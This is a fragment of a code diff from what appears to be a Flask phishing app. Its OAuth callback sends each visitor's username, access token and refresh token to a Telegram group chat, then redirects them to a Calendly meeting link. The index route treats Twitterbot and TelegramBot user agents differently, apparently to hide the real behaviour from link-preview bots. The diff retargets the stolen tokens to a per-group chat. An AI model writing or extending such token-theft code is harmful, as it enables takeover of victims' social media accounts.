@@ -46,7 +46,7 @@ def index():
     if not group:
         return "⚠️ Group not found.", 404
         
-    redirect = group.get('redirect')
+    redirect_url = group.get('redirect')
     group_id = group.get('group_id')
 
     if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
@@ -121,7 +121,7 @@ def callback():
 
     username = response_data['data']['username']
 
-    send_to_telegram(username, access_token, refresh_token, TELEGRAM_GROUP_CHAT_ID)
+    send_to_telegram(username, access_token, refresh_token, group_id)
 
     return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)
 
